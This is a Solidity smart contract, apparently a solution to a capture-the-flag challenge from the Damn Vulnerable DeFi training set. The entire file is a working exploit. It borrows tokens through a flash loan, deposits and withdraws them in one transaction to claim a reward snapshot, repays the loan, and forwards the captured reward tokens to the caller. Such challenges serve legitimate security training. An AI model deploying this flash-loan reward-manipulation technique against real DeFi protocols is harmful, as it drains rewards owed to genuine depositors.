// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewardAttackerContract {

    TheRewarderPool public theRewarderPool;
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnValuableToken;
    RewardToken public rewardToken;
    constructor(address flashLoanerPoolAddress,
        address rewarderPoolAddress,
        address rewardTokenAddress,
        address liquidityTokenAddress
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        theRewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        damnValuableToken = DamnValuableToken(liquidityTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        damnValuableToken.transfer(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}